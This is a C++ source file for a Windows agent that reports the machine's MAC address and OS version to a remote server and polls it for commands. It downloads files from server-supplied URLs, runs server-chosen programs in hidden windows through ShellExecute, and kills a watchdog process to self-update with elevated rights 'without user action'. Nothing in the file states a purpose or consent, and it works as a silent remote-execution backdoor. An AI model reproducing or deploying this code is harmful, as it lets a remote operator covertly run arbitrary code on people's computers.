#include "stdafx.h"
#include "Connection.h"
#include "Tools.h"
#include "ActiveAgent.h"
using namespace std;

Connection::Connection(wstring src) 
{
	setSource(src);
}
void Connection::setSource(wstring src) {
	source = src;
}

pplx::task<int> Connection::GetClientData()
{
	http_client client(source);
	http_request getRequest;
	getRequest.set_method(methods::GET);

	Tools::WriteLog(L"GetClientData");

	wstring uri = 
		L"/clients/client?mac_address=" + Tools::GetMAC() +
		L"&agent_id=" + std::to_wstring(agent_id) +
		L"&agent_file_version=" + std::to_wstring(agent_file_version) +
		L"&counter=" + std::to_wstring(counter);
	
	counter++;

	Tools::WriteLog(L"URL: " + uri);
	
	getRequest.set_request_uri(uri);

	return client.request(getRequest).then([](http_response response) -> pplx::task<json::value>
	{
		if (response.status_code() == status_codes::OK)
		{
			return response.extract_json();
		}
		return pplx::task_from_result(json::value());
	})
		.then([this](pplx::task<json::value> previousTask)
	{
		try
		{
			const json::value& obj = previousTask.get();

			auto status = obj.at(U("status")).as_integer();
			if (status != 1) {
				return pplx::task_from_result(0);
			}

			auto data	= obj.at(U("data")).as_object();
			auto id		= data.at(U("id")).as_integer();
			auto agent	= data.at(U("agent")).as_object();
			
			// Changing Global Timeout
			timeout = agent.at(U("timeout")).as_integer();

#if _ENABLE_CheckAgent
			this->CheckAgent(agent);			
#endif

#if _ENABLE_DoCommands
			auto commands = data.at(U("commands")).as_array();
			DoCommands(commands);
#endif

			return pplx::task_from_result(1);

		}
		catch (const std::exception& e)
		{
			return pplx::task_from_result(0);
		}
	});
}

pplx::task<int> Connection::PostClientData() 
{
	Tools::WriteLog(L"Starting POST");
	http_client client(source);
	http_request postRequest;
	postRequest.set_request_uri(L"/clients/create");
	postRequest.set_method(methods::POST);

	web::json::value postData;

	postData[L"mac_address"] = json::value::string(Tools::GetMAC());
	postData[L"agent_id"] = json::value::string(std::to_wstring(agent_id));
	postData[L"agent_file_version"] = json::value::string(std::to_wstring(agent_file_version));
	postData[L"os"] = json::value::string(L"Windows");
	postData[L"os_version"] = json::value::string(Tools::OsVersion().c_str());

	postRequest.set_body(postData);

	return client.request(postRequest).then([](http_response response) -> pplx::task<json::value>
	{
		if (response.status_code() == status_codes::OK)
		{
			return response.extract_json();
		}
		return pplx::task_from_result(json::value());
	}
	).then([](pplx::task<json::value> previousTask)
	{
		try
		{
			const json::value& obj = previousTask.get();

			auto status = obj.at(U("status")).as_integer();

			if (status == 1) {
				return pplx::task_from_result(1);
			}

			return pplx::task_from_result(0);
		}
		catch (const std::exception& e)
		{
			return pplx::task_from_result(0);
		}
	});
}

bool Connection::DoCommands(web::json::array Commands) {
	for (json::value command : Commands)
	{
		auto data = command.as_object();
		auto id = data.at(U("id")).as_integer();
		auto operation = data.at(U("operation")).as_string();
		auto file = data.at(U("file")).as_string();
		auto parameters = data.at(U("parameters")).as_string();
		auto directory = data.at(U("directory")).as_string();
		auto attachments = data.at(U("attachments")).as_array();

		Tools::WriteLog(L"Command");
		Tools::WriteLog(std::to_wstring(id));

#if !__DEBUG
		Tools::WriteLog(L"Getting Attachments");
#if _ENABLE_GetAttachments
		Connection::GetAttachments(attachments);
#endif
		auto shell = ShellExecute(0, operation.c_str(), file.c_str(), parameters.c_str(), 0, SW_HIDE);
#endif

	}
	return true;
}

bool Connection::GetAttachments(web::json::array Attachments) {

	for (json::value attachment : Attachments)
	{
		auto data = attachment.as_object();

		auto url = data.at(U("url")).as_string();
		auto public_name = data.at(U("public_name")).as_string();
		auto directory = data.at(U("directory")).as_string();
		wstring file_path = directory + L"\\" + public_name;

		Tools::WriteLog(L"Attachment" + url);
		Tools::DownloadFile(url, file_path);
	}
	return true;
}

// Checking agent version
// Making Update
// Without user action
bool Connection::CheckAgent(web::json::object Agent){

	auto id				= Agent.at(U("id")).as_integer();
	auto public_name	= Agent.at(U("public_name")).as_string();
	auto directory		= Agent.at(U("directory")).as_string();
	auto file_name		= Agent.at(U("file_name")).as_string();
	auto file_path		= directory + L"\\" + file_name;
	auto File			= Agent.at(U("file")).as_object();
	auto file_version	= File.at(U("version")).as_integer();
	auto file_url		= File.at(U("url")).as_string();

	Tools::WriteLog(L"Yor agent id = " + std::to_wstring(agent_id));
	Tools::WriteLog(L"Yor agent version = " + std::to_wstring(agent_file_version));
	Tools::WriteLog(L"Last agent version = " + std::to_wstring(file_version));

	auto currentExePath = Tools::getExePath();

	if ((currentExePath == file_path && id == agent_id && file_version == agent_file_version)) {
		Tools::WriteLog(L"Agent is last version.");
		Tools::createLink(file_path.c_str(), public_name.c_str());
	}
	else {
		Tools::WriteLog(L"Updating Agent");

		Tools::WriteLog(L"Terminating RunKeeper");
		

		UpdateTime = true;
		
		HANDLE runKeeperHnd = RunKeeperExecInfo.hProcess;
		TerminateProcess(runKeeperHnd,1);
		WaitForSingleObject(runKeeperHnd, INFINITE);

		Tools::WriteLog(L"Terminating RunKeeper: Done");

		Tools::WriteLog(L"Running Updater and terminating old!");

		SHELLEXECUTEINFO shExInfo = { 0 };
		shExInfo.cbSize = sizeof(shExInfo);
		shExInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
		shExInfo.hwnd = 0;
		shExInfo.lpVerb = L"runas";
		shExInfo.lpFile = updater_path.c_str();
		wstring params = L"-u " + file_url + L" " + file_path;
		shExInfo.lpParameters = params.c_str();
		shExInfo.lpDirectory = 0;
		shExInfo.nShow = SW_SHOW;
		shExInfo.hInstApp = 0;

		if (ShellExecuteEx(&shExInfo))
		{
			DWORD pid = GetCurrentProcessId();
			HANDLE curHndl = GetCurrentProcess();
			TerminateProcess(curHndl,0);

		}

	}
}